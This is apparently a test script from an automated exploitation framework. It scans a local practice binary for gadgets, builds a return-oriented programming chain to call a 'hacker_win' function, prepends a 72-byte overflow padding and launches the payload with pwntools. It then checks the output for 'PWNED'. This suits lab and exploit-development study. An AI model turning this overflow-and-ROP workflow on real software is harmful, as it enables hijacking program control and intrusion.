from pwn import *
from aegis.core.exploitation.rop_engine import ROPSynthesizer
import os

def test_rop_chaining():
    print("=== SPRINT 10: AUTOMATED ROP SYNTHESIS TEST ===")
    
    binary_path = "./targets/overflow_app"
    if not os.path.exists(binary_path):
        print("Error: Binary missing.")
        return

    # 1. Initialize ROP Engine
    synthesizer = ROPSynthesizer(binary_path)
    
    # 2. Scan for Gadgets
    synthesizer.find_gadgets()
    
    # 3. Build the Chain
    # We want to call 'hacker_win' using ROP logic
    rop_chain = synthesizer.build_exec_chain("hacker_win")
    
    if not rop_chain:
        print("[FAILURE] Could not build ROP chain.")
        return

    # 4. Weaponize
    # Offset is still 72 because the binary hasn't changed structure
    offset = 72
    padding = b"A" * offset
    full_payload = padding + rop_chain
    
    print(f"[WEAPON] ROP Payload Size: {len(full_payload)} bytes")

    # 5. Launch Attack
    print("\n[LAUNCH] Sending ROP Chain...")
    io = process(binary_path)
    
    # Blind send (Avoid deadlock)
    io.sendline(full_payload)
    
    # 6. Verify
    try:
        output = io.recvall(timeout=1).decode(errors='ignore')
        if "PWNED" in output:
            print("\n[SUCCESS] ROP EXECUTION CONFIRMED!")
            print("    Control flow hijacked via Return Oriented Programming.")
        else:
            print(f"\n[FAILURE] Target crashed but ROP failed.\nOutput: {output}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    test_rop_chaining()
